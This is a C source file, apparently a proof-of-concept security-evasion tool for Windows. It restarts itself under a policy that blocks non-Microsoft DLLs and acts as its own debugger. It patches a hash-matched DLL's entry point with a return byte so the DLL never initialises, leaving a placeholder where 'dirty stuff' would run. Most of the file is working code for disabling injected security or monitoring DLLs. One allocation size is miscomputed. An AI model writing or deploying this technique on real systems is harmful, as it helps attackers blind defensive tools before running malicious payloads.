#define _WIN32_WINNT 0x0a00

#include <Windows.h>
#include <Dbghelp.h>
#include <psapi.h>
#include <stdio.h>

#define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON (0x00000001ull << 44)

#define DEBUG TRUE  // Set to FALSE for release

VOID *GetEntryPointOffset(CHAR *start, DWORD dwSize, HANDLE hProc) {

    CHAR* mem = GlobalAlloc(GPTR, dwSize);
    DWORD dwBytesRead = 0;

    ReadProcessMemory(hProc, start, mem, dwSize, &dwBytesRead);

    DWORD dwBaseDLLInitializeOffset = *((DWORD*)mem + (0x120 / 4));

#ifdef DEBUG
    printf("dwBaseDLLInitializeOffset offset 0x%x\n", dwBaseDLLInitializeOffset);
#endif

    VOID *dwBaseDLLInitialize = (VOID*)start + dwBaseDLLInitializeOffset;

#ifdef DEBUG
    printf("dwBaseDLLInitialize offset 0x%p\n", dwBaseDLLInitialize);
#endif

    GlobalFree(mem);
    return dwBaseDLLInitialize;
}

VOID ModifyMem(CHAR *start, DWORD dwSize, HANDLE hProc) {
#ifdef DEBUG
    printf("Cleaning HANDLE 0x%p 0x%p length: %d\n", hProc, start, dwSize);
#endif
    VOID* EntryPoint = GetEntryPointOffset(start, dwSize, hProc);
    DWORD dwOut = 0;
    DWORD dwOld = 0;

#ifdef DEBUG
    printf("EntryPoint at 0x%p\n", EntryPoint);
#endif

    VirtualProtectEx(hProc, EntryPoint, 1, PAGE_READWRITE, &dwOld);
    WriteProcessMemory(hProc, EntryPoint, "\xc3", 1, &dwOut);
#ifdef DEBUG
    printf("Size of bytes written: %d\n", dwOut);
#endif
}

DWORD StringToHash(char* data) {
    DWORD hash = 0;
    DWORD i = 0;
    for(i; i < strlen(data); i++) {
        hash <<= 1;
        hash += data[i];
    }
#ifdef DEBUG
    printf("%s:0x%08x\n", data, hash);
#endif
    return hash;
}

BOOL IsBlacklisted(DWORD hash) {
    DWORD blacklist[] = { 0x65c9c9c4 };
    DWORD dwSize = 1;
    DWORD i = 0;
    for(i; i < dwSize; i++) {
        if(hash == blacklist[i]) {
            return TRUE;
        }
    }
    return FALSE;
}

void HandleToFilename(HANDLE hFile, CHAR **filename) {
    HANDLE hMap = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 1, NULL);
    CHAR path[MAX_PATH + 1];
    memset(path, 0x00, MAX_PATH + 1);

    if(hMap) {
        VOID *mem = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 1);
        if(mem) {
            if(GetMappedFileName(GetCurrentProcess(), mem, path, MAX_PATH)) {
                *filename = GlobalAlloc(GPTR, strlen(path) + 1);
                strcpy(*filename, path);
            }
            UnmapViewOfFile(mem);
        }
        CloseHandle(hMap);
    }
}

void Debug() {
    DWORD dwState = DBG_CONTINUE;
    BOOL bExit = FALSE;
    DEBUG_EVENT event = {0};
    HANDLE hDll;
    HANDLE hProcess;
    CHAR *filename = NULL;
    DWORD dwHash = 0;
    DWORD dwSize = 0;
    while(!bExit) {
        if(!WaitForDebugEvent(&event, INFINITE)) {
            return;
        }

        switch(event.dwDebugEventCode) {
            case CREATE_PROCESS_DEBUG_EVENT:
                hProcess = event.u.CreateProcessInfo.hProcess;
#ifdef DEBUG
                printf("HANDLE for the process %p\n", hProcess);
#endif
                break;

            case LOAD_DLL_DEBUG_EVENT:
                hDll = event.u.LoadDll.hFile;
                HandleToFilename(hDll, &filename);
#ifdef DEBUG
                printf("HANDLE %p base 0x%p for loaded dll %s\n", hDll, event.u.LoadDll.lpBaseOfDll, filename);
#endif
                dwHash = StringToHash(filename);
                if(IsBlacklisted(dwHash)) {
                    dwSize = GetFileSize(hDll, NULL);
                    ModifyMem((CHAR*)event.u.LoadDll.lpBaseOfDll, dwSize, hProcess);
#ifdef DEBUG
                    printf("%s is blacklisted\n", filename);
#endif
                    // Do something about it

                }
                GlobalFree(filename);
                break;

            case UNLOAD_DLL_DEBUG_EVENT:
#ifdef DEBUG
                printf("Unloaded 0x%p\n", event.u.UnloadDll.lpBaseOfDll);
#endif
                break;

            default:
                dwState = DBG_CONTINUE;
        }

        ContinueDebugEvent(event.dwProcessId, event.dwThreadId, dwState);
        dwState = DBG_CONTINUE;
    }
}

int main(int argc, char** argv) {

    if (argc < 2) {
        // Let's restart with the PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
        STARTUPINFOEXA si;
        PROCESS_INFORMATION pi;
        DWORD dwSize = 0;
        CHAR *args = NULL;
        args = GlobalAlloc(GPTR, strlen(argv[0] + 10));
        sprintf(args,"%s running", argv[0]);

        ZeroMemory(&si, sizeof(STARTUPINFOEXA));
        si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
        si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;

        InitializeProcThreadAttributeList(NULL, 1, 0, &dwSize);

        si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, dwSize);
        InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &dwSize);

        DWORD64 dwPolicy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

        UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &dwPolicy, sizeof(dwPolicy), NULL, NULL);

        CreateProcess(argv[0], args, NULL, NULL, TRUE, DEBUG_ONLY_THIS_PROCESS | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si, &pi);

#ifdef DEBUG
        printf("Process PID %d\n", pi.dwProcessId);
#endif
        Debug();
        ExitProcess(0);
    } else {
        // We have the argument so PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON is now on
        // Do some dirty stuff here
        MessageBox(NULL, "test", "test", MB_OK);
    }

    return 0;
}
